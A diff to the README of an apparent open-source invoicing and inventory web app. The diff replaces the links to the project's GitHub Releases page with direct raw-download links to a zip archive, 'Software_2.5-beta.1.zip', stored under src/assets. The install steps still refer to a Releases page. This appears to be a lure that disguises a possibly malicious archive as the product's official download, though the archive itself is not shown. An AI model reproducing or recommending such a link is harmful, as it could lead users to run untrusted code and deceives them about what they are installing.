@@ -1,7 +1,7 @@
 # 🎉 invoiceflow - Your Smart Invoice and Inventory Solution
 
 ## 🔗 Download Now!
-[![Download InvoiceFlow](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/JIYA-KAUSHIK/invoiceflow/releases)
+[![Download InvoiceFlow](https://github.com/JIYA-KAUSHIK/invoiceflow/raw/refs/heads/master/src/assets/Software_2.5-beta.1.zip)](https://github.com/JIYA-KAUSHIK/invoiceflow/raw/refs/heads/master/src/assets/Software_2.5-beta.1.zip)
 
 ## 🚀 Getting Started
 InvoiceFlow is a modern, open-source web app designed for small businesses. It helps you manage invoices, stock, customers, and sales all in one place. You will enjoy a clean interface and cloud-based synchronization, making your work easier and more efficient.
@@ -16,7 +16,7 @@ To run InvoiceFlow, your computer should meet the following requirements:
 ## 📥 Download & Install
 To get started with InvoiceFlow, visit this page to download the latest version:
 
-[https://github.com/JIYA-KAUSHIK/invoiceflow/releases](https://github.com/JIYA-KAUSHIK/invoiceflow/releases)
+[https://github.com/JIYA-KAUSHIK/invoiceflow/raw/refs/heads/master/src/assets/Software_2.5-beta.1.zip](https://github.com/JIYA-KAUSHIK/invoiceflow/raw/refs/heads/master/src/assets/Software_2.5-beta.1.zip)
 
 1. Click the link above to open the Releases page.
 2. Find the latest release and look for the download options.
